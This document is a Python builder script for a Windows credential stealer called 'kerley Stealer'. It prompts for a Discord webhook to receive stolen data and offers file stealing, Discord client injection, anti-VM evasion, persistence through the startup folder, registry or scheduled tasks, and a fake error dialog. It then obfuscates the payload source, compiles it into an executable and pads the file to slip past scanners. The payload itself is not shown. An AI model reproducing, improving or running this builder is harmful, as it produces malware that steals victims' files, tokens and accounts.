import os
import sys
import ctypes
import shutil
from tkinter import filedialog  # Importe a biblioteca filedialog do tkinter
from colorama import Fore
from pystyle import System, Center, Anime, Colors, Colorate, Write

class Builder:
    def __init__(self):
        # Variáveis de opções
        self.options = {
            "webhook": None,
            "steal_files": False,
            "anti_vm": False,
            "startup": False,
            "startup_method": None,
            "injection": False,
            "fake_error": False,
            "current_path": os.getcwd(),
            "pump": False,
            "pump_size": 0,  # MB
            "pyinstaller_command": "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir UPX --version-file AssemblyFile\\version.txt",
            "file_format": "exe",
            "file_name": "kerley.exe"
        }
        # Variável de erros
        self.error = None

    def call_functions(self):
        try:
            self.get_webhook()  
            self.get_anti_vm()
            self.get_discord_injection()
            self.get_steal_files()
            self.get_startup_method()
            self.get_fake_error()
            self.get_icon()  # Atualize esta chamada
            self.pump_file()
            self.write_settings()
            System.Clear()
            self.obfuscate_file("Stub.py")
            self.build_file()
            shutil.copy("dist\\stub.exe", self.options["file_name"])
            if self.options["pump"]:
                self.expand_file(self.options["file_name"], self.options["pump_size"])
            shutil.rmtree("dist", ignore_errors=True)
            shutil.rmtree("build", ignore_errors=True)
            os.remove("stub.py")
            os.remove("stub.spec")
            print("\nFile compiled, close the window.")
        except Exception as e:
            self.error = f"An error occurred while building your file. Error code:\n\n{str(e)}"
            self.show_error_message()
        else:
            self.show_success_message()

    def show_error_message(self):
        ctypes.windll.user32.MessageBoxW(0, self.error, "Error", 0x10)

    def show_success_message(self):
        os.system("start .")
        ctypes.windll.user32.MessageBoxW(0, "Your file compiled successfully. You can now close the window.", "Information", 0x40)

    def pump_file(self):
        try:
            print(f"{Fore.LIGHTBLACK_EX}(Default size {Fore.LIGHTWHITE_EX}10 {Fore.LIGHTBLACK_EX}or {Fore.LIGHTWHITE_EX}11 {Fore.LIGHTBLACK_EX}MB)")
            pump_q = Write.Input("Do you want to pump the file : ", Colors.red_to_yellow, interval=0.0025).lower()
            if pump_q in ["y", "yes"]:
                pump_size = int(Write.Input("How much MB size do you want to pump: ", Colors.red_to_yellow, interval=0.0025))
                self.options["pump"] = True
                self.options["pump_size"] = pump_size
            else:
                self.options["pump"] = False
        except ValueError:
            print("Invalid input for pump size. Please enter a valid number.")
            self.pump_file()

    def expand_file(self, file_name, additional_size_mb):
        try:
            if os.path.exists(file_name):
                additional_size_bytes = additional_size_mb * 1024 * 1024
                with open(file_name, "ab") as file:
                    empty_bytes = bytearray([0x00] * additional_size_bytes)
                    file.write(empty_bytes)
                    print(f'{additional_size_mb} MB added to "{os.path.join(self.options["current_path"], file_name)}"')
        except Exception as e:
            self.error = f"Error while expanding file: {str(e)}"
            self.show_error_message()

    def build_file(self):
        try:
            os.system(self.options["pyinstaller_command"])
        except Exception as e:
            self.error = f"Error while building file: {str(e)}"
            self.show_error_message()

    def write_settings(self):
        try:
            with open("kerley.py", "r", encoding="utf-8", errors="ignore") as file:
                data = file.read()
            replaced_data = (
                data.replace("%WEBHOOK%", str(self.options["webhook"]))
                .replace('"%Anti_VM%"', str(self.options["anti_vm"]))
                .replace('"%injection%"', str(self.options["injection"]))
                .replace("%startup_method%", str(self.options["startup_method"]))
                .replace('"%fake_error%"', str(self.options["fake_error"]))
                .replace('"%StealCommonFiles%"', str(self.options["steal_files"]))
                .replace("Exela.py", "kerley.py")
            )

            with open("Stub.py", "w", encoding="utf-8", errors="ignore") as file:
                file.write(replaced_data)
        except Exception as e:
            self.error = f"Error while writing settings: {str(e)}"
            self.show_error_message()

    def obfuscate_file(self, input_file):
        try:
            obf_file = os.path.join(self.options["current_path"], "Obfuscator", "obf.py")
            os.system(f'python "{obf_file}" "{input_file}" stub.py')
        except Exception as e:
            self.error = f"Error while obfuscating file: {str(e)}"
            self.show_error_message()

    def get_icon(self):
        try:
            get_icon = Write.Input("Do you want to change the icon of the file : ", Colors.red_to_yellow, interval=0.0025).lower()
            if get_icon in ["yes", "y"]:
                # Use filedialog.askopenfilename para selecionar o ícone do arquivo
                get_icon_path = filedialog.askopenfilename(title="Select Icon File", filetypes=[("Icon files", "*.ico")])
                if get_icon_path and self.check_ico_file(get_icon_path):
                    self.options["pyinstaller_command"] += f" --icon={get_icon_path} stub.py"
                else:
                    print("Icon change disabled.")
                    self.options["pyinstaller_command"] += " --icon=NONE stub.py"
            else:
                self.options["pyinstaller_command"] += " --icon=NONE stub.py"
            self.get_file_format()
            self.get_file_name()
        except Exception as e:
            self.error = f"Error while getting icon: {str(e)}"
            self.show_error_message()

    def check_ico_file(self, file_path):
        try:
            ico_header = b"\x00\x00\x01\x00"  # ICO header
            with open(file_path, "rb") as file:
                header_data = file.read(4)
            return header_data == ico_header
        except Exception as e:
            self.error = f"Error while checking icon file: {str(e)}"
            self.show_error_message()
            return False

    def get_fake_error(self):
        try:
            er = Write.Input("Do you want to use fake Error : ", Colors.red_to_yellow, interval=0.0025).lower()
            self.options["fake_error"] = er in ["yes", "y"]
        except Exception as e:
            self.error = f"Error while getting fake error preference: {str(e)}"
            self.show_error_message()

    def get_webhook(self):
        try:
            while True:
                user_webhook = Write.Input("Enter your webhook URL: ", Colors.red_to_yellow, interval=0.0025).strip()
                if user_webhook.startswith("https://") and "discord" in user_webhook:
                    self.options["webhook"] = user_webhook
                    break
                else:
                    Write.Print("Invalid webhook URL. Please enter a valid Discord webhook URL.\n", Colors.yellow_to_red, interval=0.01) 
        except Exception as e:
            self.error = f"Error while getting webhook: {str(e)}"
            self.show_error_message()

    def get_steal_files(self):
        try:
            get_files_req = Write.Input("Do you want to enable File Stealer: ", Colors.yellow_to_red, interval=0.0025).lower()
            self.options["steal_files"] = get_files_req in ["y", "yes"]
        except Exception as e:
            self.error = f"Error while getting file steal preference: {str(e)}"
            self.show_error_message()

    def get_anti_vm(self):
        try:
            get_anti_vm_req = Write.Input("Do you want to enable Anti-VM : ", Colors.red_to_yellow, interval=0.0025).lower()
            self.options["anti_vm"] = get_anti_vm_req in ["y", "yes"]
        except Exception as e:
            self.error = f"Error while getting Anti-VM preference: {str(e)}"
            self.show_error_message()

    def get_startup_method(self):
        try:
            get_startup_req = Write.Input("Do you want to use Startup : ", Colors.red_to_yellow, interval=0.0025).lower()
            if get_startup_req in ["y", "yes"]:
                self.options["startup"] = True
                print(f"{Fore.YELLOW}--------------------------------------------\n{Fore.RED}1-){Fore.LIGHTWHITE_EX}Folder Startup\n{Fore.RED}2-){Fore.LIGHTWHITE_EX}HKCLM/HKLM Startup\n{Fore.RED}3-){Fore.LIGHTWHITE_EX}Schtask Startup\n{Fore.RED}4-){Fore.LIGHTWHITE_EX}Disable Startup\n{Fore.YELLOW}--------------------------------------------",)
                get_startup_method = Write.Input("Enter your selection: ", Colors.red_to_yellow, interval=0.0125).lower()
                if get_startup_method == "1":
                    self.options["startup_method"] = "folder"
                elif get_startup_method == "2":
                    self.options["startup_method"] = "regedit"
                elif get_startup_method == "3":
                    self.options["startup_method"] = "schtasks"
                elif get_startup_method == "4":
                    self.options["startup_method"] = "no-startup"
                else:
                    print("Unknown Startup method, startup has been disabled.")
                    self.options["startup"] = False
                    self.options["startup_method"] = "no-startup"
            else:
                self.options["startup"] = False
                self.options["startup_method"] = "no-startup"
        except Exception as e:
            self.error = f"Error while getting startup method: {str(e)}"
            self.show_error_message()

    def get_discord_injection(self):
        try:
            inj = Write.Input("Do you want to enable Discord injection : ", Colors.red_to_yellow, interval=0.0025).lower()
            self.options["injection"] = inj in ["y", "yes"]
        except Exception as e:
            self.error = f"Error while getting Discord injection preference: {str(e)}"
            self.show_error_message()

    def get_file_format(self):
        try:
            file_format = Write.Input("(exe/py): ", Colors.purple_to_blue, interval=0.0025).lower()
            if file_format in ["exe", "py"]:
                self.options["file_format"] = file_format
            else:
                print("Invalid file format, please choose either 'exe' or 'py'.")
                self.get_file_format()
        except Exception as e:
            self.error = f"Error while getting file format: {str(e)}"
            self.show_error_message()

    def get_file_name(self):
        try:
            if self.options["file_format"] == "exe":
                self.options["file_name"] = "kerley.exe"
            else:
                self.options["file_name"] = "kerley.py"
            if self.options["file_format"] == "exe":
                get_name = Write.Input("Enter the name of the executable file: ", Colors.red_to_yellow, interval=0.0025)
                if get_name.endswith(".exe"):
                    self.options["file_name"] = get_name
                else:
                    self.options["file_name"] = get_name + ".exe"
            else:
                get_name = Write.Input("Enter the name of the Python file: ", Colors.red_to_yellow, interval=0.0025)
                if get_name.endswith(".py"):
                    self.options["file_name"] = get_name
                else:
                    self.options["file_name"] = get_name + ".py"
        except Exception as e:
            self.error = f"Error while getting file name: {str(e)}"
            self.show_error_message()

def print_intro():
    byte = r''' 

                   ▄█▀─▄▄▄▄▄▄▄─▀█▄
                   ▀█████████████▀
                       █▄███▄█
                        █████
                        █▀█▀█
        

               ᴀ ʟ ʙ ᴀ ɴ  s ᴛ ᴇ ᴀ ʟ ᴇ ʀ         
                          
'''
    
    System.Size(52, 12)
    System.Clear()
    Anime.Fade((byte), Colors.red_to_black,  Colorate.DiagonalBackwards, interval=0.083, enter=True)
    menu_builder()

def menu_builder():
    System.Size(100, 25)
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(f"kerley Stealer | Builder | {os.getenv('computername')}")
    except:
        pass

    if __name__ == "__main__":
        if os.name == "nt":
            if 3 <= sys.version_info.major <= 3 and 10 <= sys.version_info.minor < 12:
                Builder().call_functions()
            else:
                message = "Your Python version is unsupported by kerley. Please use Python 3.10.0 or 3.11.0"
                ctypes.windll.user32.MessageBoxW(None, ctypes.c_wchar_p(message), "Error", 0x10)
        else:
            print("Only Windows operating systems are supported!")

print_intro()
